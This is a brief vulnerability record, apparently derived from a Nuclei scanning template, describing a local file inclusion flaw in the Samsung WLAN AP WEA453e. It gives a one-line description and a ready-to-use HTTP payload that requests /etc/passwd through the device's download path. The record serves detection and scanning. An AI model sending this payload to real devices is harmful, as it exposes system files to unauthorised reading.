# Vulnerability: Samsung WLAN AP WEA453e - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`samsung-wlan-ap-lfi.yaml`)

## Description
Samsung WLAN AP WEA453e is susceptible to local file inclusion vulnerabilities.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/(download)/etc/passwd
```

